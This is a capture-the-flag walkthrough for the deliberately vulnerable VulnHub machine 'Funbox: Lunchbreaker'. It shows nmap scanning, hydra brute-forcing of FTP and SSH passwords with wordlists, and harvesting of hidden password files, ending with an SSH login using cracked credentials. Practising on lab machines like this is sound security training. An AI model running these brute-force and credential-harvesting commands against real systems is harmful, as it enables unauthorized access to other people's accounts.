:::::::::::::::::::::::::::::::::::::::: page
# Funbox: Lunchbreaker {#funbox-lunchbreaker .title}

\

## 

## Funbox: Lunchbreaker

- **[Funbox: Lunchbreaker]{style="color:#5e5c64;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/funbox-lunchbreaker,700/>

![](images/832-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#3f4043;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/832-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.240
:::

![](images/832-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.240
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.240
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.240
:::

![](images/832-4.png)

1.  [Web Enumeration]{style="color:#3f4043;"} :

- IP visit in browser : <http://192.168.2.240>
  <http://192.168.2.240/robots.txt>

<!-- -->

- Inspect the source code then find hint :

![](images/832-5.png)

- Find the clue :

::: codebox
     webdesign by j.miller [jane@funbox8.ctf] 
:::

- Run hydra to brute force the password :

::: codebox
    hydra -V -l jane -P /opt/rockyou.txt 192.168.2.240 ftp
:::

![](images/832-6.png)

- Found username and password :

::: codebox
    Username : jane
    Password : password
:::

1.  [FTP Enumeration]{style="color:#3f4043;"} :

- FTP login :

::: codebox
    ftp 192.168.2.240
:::

![](images/832-7.png)

- Check file list :

::: codebox
    ls -la
:::

- Download the file :

::: codebox
    get .s3cr3t
:::

- 

::: codebox
    get supers3cr3t
:::

![](images/832-8.png)

- Read the file :

::: codebox
    cat .s3cr3t
:::

- 

::: codebox
    cat supers3cr3t
:::

![](images/832-9.png) The supers3cr3t file content appears to be
Brainfuck encoded text .

- Decode the value :

::: codebox
    cat .s3cr3t | base64 -d
:::

![](images/832-10.png)

- Download the wordpress directory from ftp :

::: codebox
    wget -m ftp://anonymous:anonymous@192.168.2.240/wordpress/
:::

![](images/832-11.png)

- Login jane user :

::: codebox
    ftp 192.168.2.240
:::

- 

::: codebox
    ls
:::

- 

::: codebox
    cd backups
:::

- 

::: codebox
    ls
:::

- 

::: codebox
    get keys.txt
:::

![](images/832-12.png)

- Read the file :

::: codebox
    cat keys.txt
:::

![](images/832-13.png)

- Navigate to home directory :

::: codebox
    cd /home
:::

- Check hidden file list :

::: codebox
    ls -la
:::

![](images/832-14.png)

- Run hydra to brute force the password jim user :

::: codebox
    hydra -V -l jim -P /opt/rockyou.txt 192.168.2.240 ftp
:::

![](images/832-15.png)

- Found username and password :

::: codebox
    Username : jim
    Password : 12345
:::

- Note : Isme ftp login kiya but isme kuch nhi mila h .

<!-- -->

- Run hydra to brute force the password for jules user :

::: codebox
    hydra -l jules -P /opt/rockyou.txt ftp://192.168.2.240
:::

![](images/832-16.png)

- Found username and password :

::: codebox
    Username : jules
    Password : sexylady
:::

- Login jules user :

::: codebox
    ftp 192.168.2.240
:::

- 

::: codebox
    ls -la
:::

- 

::: codebox
    cd .backups
:::

- 

::: codebox
    ls -la
:::

- 

::: codebox
    get .bad-passwds
:::

- 

::: codebox
    get .good-passwd
:::

![](images/832-17.png)

![](images/832-18.png)

1.  [SSH Access]{style="color:#3f4043;"} :

- SSH brute force with john user :

::: codebox
    hydra -l john -P .bad-passwds ssh://192.168.2.240
:::

![](images/832-19.png)

- SSH login :

::: codebox
    ssh john@192.168.2.240
:::

::: codebox
    Username : john
    Password : zhnmju!!!
:::

![](images/832-20.png)
::::::::::::::::::::::::::::::::::::::::
